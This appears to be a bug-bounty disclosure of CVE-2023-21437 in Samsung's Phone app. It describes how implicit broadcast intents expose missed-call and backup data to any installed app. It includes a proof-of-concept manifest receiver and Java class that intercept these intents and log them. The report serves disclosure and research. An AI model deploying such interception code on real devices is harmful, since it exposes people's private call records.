# Details

<table>
    <tr>
        <td>Name</td>
        <td>Phone</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.samsung.android.dialer</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.09.20</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2023.02.07</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-21437">CVE-2023-21437</a> (SVE-2022-2328)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$1045</td>
    </tr>
</table>

# Description

Oversecured report:
![](04%20رئيسية/Samsung%20Vulnerabilities/125.%20Phone%20—%20Disclosure%20of%20missed%20calls%20data/Oversecured_report.png)

Oversecured found multiple uses of implicit intents in the Phone app when sending broadcasts. They contained sensitive data, such as missed calls data in the `com/samsung/android/dialer/notification/view/CallLogNotificationActivity.java` file. These intents could be intercepted by any third-party apps installed on the same device.

**Proof of Concept**

File `AndroidManifest.xml`:
```xml
<receiver android:name=".MyReceiver" android:exported="true">
    <intent-filter>
        <action android:name="com.samsung.android.app.reminder.action.REGISTER" />
        <action android:name="com.samsung.android.intent.action.RESPONSE_RESTORE_DIALER_SETTING" />
        <action android:name="com.samsung.android.intent.action.RESPONSE_BACKUP_DIALER_SETTING" />
        <action android:name="com.samsung.android.intent.action.RESPONSE_BACKUP_CALLLOG" />
        <action android:name="com.samsung.android.intent.action.RESPONSE_RESTORE_DIALER_SETTING" />
        <action android:name="com.samsung.android.intent.action.RESPONSE_RESTORE_CALLLOG" />
        <action android:name="com.samsung.android.intent.action.RESPONSE_BACKUP_CALLLOG" />
        <action android:name="com.samsung.android.intent.action.RESPONSE_BACKUP_DIALER_SETTING" />
        <action android:name="com.samsung.android.intent.action.RESPONSE_RESTORE_CALLLOG" />
    </intent-filter>
</receiver>
```

File `MyReceiver.java`:
```java
public class MyReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        DumpUtils.dump(intent, context.getClassLoader());
    }
}
```

The implementation of the `DumpUtils.dump()` method can be found in the source code. We use the functionality of the Gson library to turn objects of any class into a string and then dump it to the log.

## References

- [Oversecured Blog. Interception of Android implicit intents](https://blog.oversecured.com/Interception-of-Android-implicit-intents/)
